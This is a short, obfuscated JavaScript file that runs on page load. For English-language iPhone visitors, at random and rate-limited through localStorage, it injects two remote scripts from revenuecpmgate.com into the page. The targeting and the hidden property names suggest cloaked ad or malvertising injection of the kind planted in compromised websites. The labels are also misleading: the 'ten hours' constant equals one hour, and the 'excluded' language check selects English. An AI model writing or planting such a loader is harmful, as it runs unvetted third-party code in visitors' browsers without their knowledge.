function isIphone() {
    return /iPhone/i ['test'](navigator['userAgent'])
}

function isLanguageExcluded() {
    const language = navigator['language']['toLowerCase']();
    return language['includes']('en')
}



function canExecuteByFrequency() {
    const lastExecutionKey = 'lastAdExecutionTimestamp';
    const lastExecutionTime = localStorage['getItem'](lastExecutionKey);
    if (!lastExecutionTime) {
        return true
    }
    const tenHoursInMillis = 1 * 60 * 60 * 1000;
    const timeSinceLastExecution = window["Date"]['now']() - window["parseInt"](lastExecutionTime, 10);
    return timeSinceLastExecution > tenHoursInMillis
}

function executeAdScript() {
    if (isIphone() && isLanguageExcluded() && canExecuteByFrequency()) {
	 if (window["Math"]['random']() < 0.6) {
        const script1 = window["document"]['createElement']('script');
        script1['type'] = 'text/javascript';
        script1['src'] = '//pl27628871.revenuecpmgate.com/bc/88/84/bc88842a70674a0bfb85bf63a9a64c78.js';
        window["document"]['head']['appendChild'](script1);
        localStorage['setItem']('lastAdExecutionTimestamp', window["Date"]['now']()['toString']());
       
            const script2 = window["document"]['createElement']('script');
            script2['type'] = 'text/javascript';
            script2['src'] = '//pl27798995.revenuecpmgate.com/e1/f3/15/e1f3155eb62046226bb4ff1cb2d2f2fe.js';
            window["document"]['head']['appendChild'](script2)
        }
    }
}
window["document"]['addEventListener']('DOMContentLoaded', executeAdScript);
